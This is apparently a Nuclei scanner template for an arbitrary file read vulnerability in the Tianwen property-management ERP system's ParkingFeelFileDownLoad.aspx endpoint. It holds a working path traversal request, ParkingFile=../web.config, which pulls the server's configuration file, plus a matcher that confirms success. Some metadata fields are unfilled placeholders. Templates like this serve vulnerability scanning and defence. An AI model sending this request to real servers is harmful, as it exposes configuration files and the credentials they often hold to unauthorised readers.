id: tianwenwuye-erp-ParkingFeelFileDownLoad-fileread
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 天问物业ERP系统ParkingFeelFileDownLoad存在任意文件读取漏洞
  reference:
    - https://
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/HM/M_main/InformationManage/ParkingFeelFileDownLoad.aspx?ParkingFile=../web.config"
    matchers:
      - type: word
        part: body
        words:
          - '<?xml'
